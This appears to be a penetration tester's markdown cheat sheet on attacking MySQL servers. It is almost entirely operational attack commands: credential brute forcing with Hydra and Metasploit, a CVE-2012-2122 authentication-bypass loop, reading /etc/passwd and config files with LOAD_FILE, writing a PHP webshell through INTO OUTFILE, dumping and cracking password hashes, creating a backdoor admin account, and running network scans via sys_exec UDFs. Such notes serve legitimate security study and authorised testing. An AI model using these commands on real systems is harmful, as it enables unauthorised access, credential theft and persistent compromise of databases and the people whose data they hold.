---
id: Exploitation
aliases: []
tags:
  - Networking/Services/MySQL/Exploitation
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Credentials {{{-->
## Credentials

<!-- Common Credentials {{{-->
### Common Credentials

Enumerate with [[Enumeration#Nmap|]] for common credentials
(*e.g.  `admin`, `administrator`, `root`, `user`, `test`, etc.*)

```sh
mysql -u <user> -p <password>
```

<!-- }}} -->

<!-- Brute Force {{{-->
### Brute Force

<!-- Wordlist {{{-->
> [!tip]- Wordlist
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
>
> - [SecLists - mysql-betterdefaultpasslist.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt)
>
> ```sh
> /usr/share/wordlists/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt
> ```
<!-- }}} -->

[[Hydra]] — Brute force credentials

```sh
hydra -L <users.txt> -P <passwords.txt> -f [-S port] mysql://$target
```

[[Metasploit]] — Brute force credentials with MySQL Login Utility
([mysql_login](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_login/))

```sh
use auxiliary/scanner/mysql/mysql_login
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf > use auxiliary/scanner/mysql/mysql_login
> msf auxiliary(mysql_login) > show actions
>     ...actions...
> msf auxiliary(mysql_login) > set ACTION < action-name >
> msf auxiliary(mysql_login) > show options
>     ...show and set options...
> msf auxiliary(mysql_login) > run
> ```
>
> ```sh
> use auxiliary/scanner/mysql/mysql_login
> msf auxiliary(scanner/mysql/mysql_login) > set rhosts X.X.X.X
> msf auxiliary(scanner/mysql/mysql_login) > set user_file /path/to/user.txt
> msf auxiliary(scanner/mysql/mysql_login) > set pass_file /path/to/pass.txt
> msf auxiliary(scanner/mysql/mysql_login) > set stop_on_success true
> msf auxiliary(scanner/mysql/mysql_login) > exploit
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- CVE Exploits {{{-->
## CVE Exploits

<!-- CVE-2012-2122 {{{-->
### CVE-2012-2122

[CVE-2012-2122](https://nvd.nist.gov/vuln/detail/CVE-2012-2122)
allows remote attackers to bypass authentication
by repeatedly authenticating with the same incorrect password

<!-- Info {{{-->
> [!info]-
>
> `sql/password.c`:
> when running in certain environments
> with certain implementations of the `memcmp` function,
> allows remote attackers to bypass authentication
> by repeatedly authenticating with the same incorrect password,
> which eventually causes a token comparison to succeed
> due to an improperly-checked return value
>
> Oracle MySQL
>
> - `5.1.x` before `5.1.63`
> - `5.5.x` before `5.5.24`
> - `5.6.x` before `5.6.6`
>
> MariaDB
>
> - `5.1.x` before `5.1.62`
> - `5.2.x` before `5.2.12`
> - `5.3.x` before `5.3.6`
> - `5.5.x` before `5.5.23`
>
<!-- }}} -->

```sh
for i in `seq 1 1000`; \
  do mysql -u root --password=<bad_password> -h $target 2>/dev/null; \
done
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> for i in `seq 1 1000`; \
>   do mysql -u root --password=bad -h 127.0.0.1 2>/dev/null; \
> done
> ```
>
> ```sh
> mysql>
> ```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Enumeration {{{-->
## Enumeration

<!-- Metasploit {{{-->
### Metasploit

Metasploit post-authentication modules

> [!warning]
>
> Valid credentials required

MYSQL Password Hashdump
(*[mysql_hashdump](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_hashdump/)*)

```sh
use auxiliary/scanner/mysql/mysql_hashdump
```

<!-- Info {{{-->
> [!info]-
>
> This module extracts the usernames and encrypted password
> hashes from a MySQL server and stores them for later cracking
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf > use auxiliary/scanner/mysql/mysql_hashdump
> msf auxiliary(mysql_hashdump) > show actions
>     ...actions...
> msf auxiliary(mysql_hashdump) > set ACTION < action-name >
> msf auxiliary(mysql_hashdump) > show options
>     ...show and set options...
> msf auxiliary(mysql_hashdump) > run
> ```
<!-- }}} -->

MySQL Enumeration Module
(*[mysql_enum](https://www.rapid7.com/db/modules/auxiliary/admin/mysql/mysql_enum/)*)

```sh
use auxiliary/admin/mysql/mysql_enum
```

<!-- Info {{{-->
> [!info]-
>
> This module allows for simple enumeration of MySQL Database Server
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf > use auxiliary/admin/mysql/mysql_enum
> msf auxiliary(mysql_enum) > show actions
>     ...actions...
> msf auxiliary(mysql_enum) > set ACTION < action-name >
> msf auxiliary(mysql_enum) > show options
>     ...show and set options...
> msf auxiliary(mysql_enum) > run
> ```
<!-- }}} -->

MYSQL Schema Dump
(*[mysql_schemadump](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_schemadump/)*)

```sh
use auxiliary/scanner/mysql/mysql_schemadump
```

<!-- Info {{{-->
> [!info]-
>
> This module extracts the schema information from a MySQL DB server
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf > use auxiliary/scanner/mysql/mysql_schemadump
> msf auxiliary(mysql_schemadump) > show actions
>     ...actions...
> msf auxiliary(mysql_schemadump) > set ACTION < action-name >
> msf auxiliary(mysql_schemadump) > show options
>     ...show and set options...
> msf auxiliary(mysql_schemadump) > run
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Server {{{-->
### Server

Identify server version (*e.g., os, build, edetion, etc.*)

```sql
SELECT @@version_compile_os;
```

```sh
SELECT @@version_compile_machine;
```

```sh
SHOW VARIABLES LIKE "%version%";
```

<!-- }}} -->

<!-- Version Info {{{-->
### Version Info

Identify MySQL server version to determine applicable exploits and vulnerabilities

```sh
SELECT @@version;
```

```sh
SELECT VERSION();
```

<!-- }}} -->

<!-- User {{{-->
### User

Enumerate user accounts and their permissions for privilege escalation
and for lateral movement

Show current user

```sql
SELECT USER();
```

```sql
SELECT CURRENT_USER();
```

List MySQL users

```sql
SELECT user, host FROM mysql.user;
```

<!-- User Privileges {{{-->
#### User Privileges

Check user privileges and role memberships

Show user privileges

```sql
SHOW GRANTS;
```

```sql
SHOW GRANTS FOR '<username>'@'<host>';
```

List users with `FILE` privilege

```sql
SELECT user, host FROM mysql.user WHERE File_priv = 'Y';
```

List users with `SUPER` privilege

```sql
SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
```

<!-- }}} -->

<!-- UDFs {{{-->
#### UDFs

Enumerate [User Defined Functions](https://dev.mysql.com/doc/extending-mysql/8.0/en/adding-functions.html)
available to call

> [!tip]
>
> User Defined Functions may lead to [[#Command Execution]]

Check for custom user functions

```sql
SELECT * FROM mysql.func;
```

Return the name of the installed UDFs

```sql
SELECT name FROM mysql.func;
```

<!-- }}} -->

<!-- }}} -->

<!-- Configuration {{{-->
### Configuration

Show important variables

```sh
SHOW VARIABLES;
```

<!-- Example {{{-->
> [!example]-
>
> File operations directory
>
> ```sh
> SHOW VARIABLES LIKE 'secure_file_priv';
> ```
>
> Plugin directory
>
> ```sh
> SHOW VARIABLES LIKE 'plugin_dir';
> ```
>
> Data directory
>
> ```sh
> SHOW VARIABLES LIKE 'datadir';
> ```
>
> Base directory
>
> ```sh
> SHOW VARIABLES LIKE 'basedir';
> ```
<!-- }}} -->

Check if `local_infile` enabled

```sh
SHOW VARIABLES LIKE 'local_infile';
```

<!-- Info {{{-->
> [!info]-
>
> Enabling `local_infile` allows loading data from local files
> (*attacker machine*) via the `LOAD DATA LOCAL INFILE` statement
>
> > [!example]-
> >
> > ```sh
> > LOAD DATA LOCAL INFILE '<data.csv>' INTO TABLE my_table;
> > ```
<!-- }}} -->

Process list

```sh
SHOW PROCESSLIST;
```

<!-- Info {{{-->
> [!info]-
>
> `SHOW PROCESSLIST;` may reveal
>
> - **Active queries** — (*e.g., password checks, file paths, etc.*)
> - **Usernames & Hosts** — Shows who is connected
> - **Database Names** — Visible in the `db` column
<!-- }}} -->

<!-- }}} -->

___

<!-- }}} -->

<!-- Command Execution {{{-->
## Command Execution

MySQL supports [user-defined functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/)
that allows to execute C/C++ code as a function within SQL

[mysqludf/lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)

___
<!-- }}} -->

<!-- Data Exfiltration {{{-->
## Data Exfiltration

Extract sensitive data

```sql
SELECT * FROM <table>;
```

<!-- Example {{{-->
> [!example]-
>
> Select every user with `admin` role
>
> ```sql
> SELECT * FROM users WHERE role='admin';
> ```
>
> Select every important attribute
>
> ```sql
> SELECT username, password, email FROM accounts;
> ```
<!-- }}} -->

Export database to file

```sql
SELECT * FROM <table> INTO OUTFILE '<file>' FIELDS TERMINATED BY ',' ENCLOSED BY '"' LINES TERMINATED BY '\n';
```
Concatenate and export

```sql
SELECT CONCAT(username, ':', password) FROM users INTO OUTFILE '<file>';
```
___

<!-- }}} -->

<!-- File Operations {{{-->
## File Operations

Check `secure_file_priv` privilege

<!-- Info {{{-->
> [!info]-
>
> [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv)
> limits the effect of data import and export operations
> (*e.g., `LOAD DATA`, `SELECT … INTO OUTFILE` and
> [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file)
> *)
>
> `secure_file_priv` values
>
> - **Empty**: The variable has no effect (*not secure*)
> - **Set to the name of a directory**:
>   The server limits import and export operations
>   to work only with files in that directory.
>   The directory must exist; the server does not create it
> - `NULL`: The server disables import and export operations
<!-- }}} -->

```sh
SHOW VARIABLES LIKE 'secure_file_priv';
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> mysql> show variables like "secure_file_priv";
> ```
> ```sh
> +------------------+-------+
> | Variable_name    | Value |
> +------------------+-------+
> | secure_file_priv |       |
> +------------------+-------+
>
> 1 row in set (0.005 sec)
> ```
>
> `secure_file_priv` is set to empty
<!-- }}} -->

<!-- Read Files {{{-->
### Read Files

Read files from the server
(*with [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file)
privileges*)

```sh
SELECT LOAD_FILE('/path/to/file');
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> SELECT LOAD_FILE('/etc/passwd');
> ```
>
> ```
> SELECT LOAD_FILE('/var/www/html/config.php');
> ```
>
> ```sh
> SELECT LOAD_FILE('C:\\Windows\\win.ini');
> ```
>
> > [!tip]
> >
> > Read file with hex encoding (*bypasses binary issues*)
> >
> > ```sh
> > SELECT HEX(LOAD_FILE('/etc/passwd'));
> > ```
<!-- }}} -->

<!-- }}} -->

<!-- Write Files {{{-->
### Write Files

Write files to the server
(*with [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file)
privileges*)

```sql
SELECT '<content>' INTO OUTFILE '<file>';
```

<!-- Example {{{-->
> [!example]-
>
> Upload a PHP webshell
>
> ```sql
> SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
> ```
<!-- }}} -->

<!-- }}} -->

___

<!-- }}} -->

<!-- Password Hash {{{-->
## Password Hash

<!-- Extraction {{{-->
### Extraction

Extract password hashes (*MySQL < 5.7*)

```sql
SELECT user, password FROM mysql.user;
```

Extract password hashes (*MySQL >= 5.7*)

```sql
SELECT user, authentication_string FROM mysql.user;
```

Specific user hash (*e.g. `root`*)

```sql
SELECT authentication_string FROM mysql.user WHERE user='root';
```

Export hashes to file

```sql
SELECT user, authentication_string FROM mysql.user INTO OUTFILE '/tmp/hashes.txt';
```

Extract hashes

```sh
mysql -u root -p -e "SELECT CONCAT(user, ':', authentication_string) FROM mysql.user" > mysql_hashes.txt
```

<!-- }}} -->

<!-- Cracking {{{-->
### Cracking

[[Hashcat]] — Crack hashes (*MySQL 4.1/MySQL 5+*)

```sh
hashcat -m 300 <mysql_hashes.txt> <rockyou.txt>
```

<!-- Mode {{{-->
> [!info]- Mode
>
> - `-m 300`: Mode `300` (*MySQL4.1/MySQL5*)
<!-- }}} -->

[[Hashcat]] — Crack hashes (*MySQL pre-4.1*)

```sh
hashcat -m 200 <old_mysql_hash.txt> <rockyou.txt>
```

<!-- Mode {{{-->
> [!info]- Mode
>
> - `-m 200`: Mode `200` (MySQL323)
<!-- }}} -->

[[John The Ripper]] — Crack hashes

```sh
john --format=mysql-sha1 <mysql_hashes.txt>
```

<!-- }}} -->

___
<!-- }}} -->

<!-- Privilege Escalation {{{-->
## Privilege Escalation

Create new admin user

<!-- Example {{{-->
> [!example]-
>
> 1. Create a new user account
>
> ```sql
> CREATE USER '<user>'@'%' IDENTIFIED BY '<password>';
> ```
>
> 2. Grant full privileges on databases and tables
>
> ```sql
> GRANT ALL PRIVILEGES ON *.* TO '<user>'@'%' WITH GRANT OPTION;
> ```
>
> 3. Reload privilege tables
>
> ```sql
> FLUSH PRIVILEGES;
> ```
<!-- }}} -->

Modify existing user password

<!-- Example {{{-->
> [!example]-
>
> 1. Change the stored password hash for the `root` entry
>
> ```sql
> UPDATE mysql.user SET password=PASSWORD('<new_password>') WHERE user='root';
> ```
>
> 2. Reload privilege tables
>
> ```sh
> FLUSH PRIVILEGES;
> ```
<!-- }}} -->

Grant `FILE` privilege to user

<!-- Example {{{-->
> [!example]-
>
> 1. Grant `FILE` privilege to the user
>
> ```sql
> GRANT FILE ON *.* TO '<user>'@'localhost';
> ```
>
> 2. Reload privilege tables
>
> ```sql
> FLUSH PRIVILEGES;
> ```
<!-- }}} -->

___

<!-- }}} -->

<!-- Lateral Movement {{{-->
## Lateral Movement

Enumerate network from MySQL
if [[#UDFs]] are available

```sql
SELECT sys_exec('ping -c 1 <192.168.1.1>');
```

```sql
SELECT sys_exec('nmap -sn <192.168.1.0/24>');
```

Access other databases if credentials are reused

```sh
mysql -h <another-host.com> -u <root> -p
```

<!-- }}} -->

<!-- }}} -->
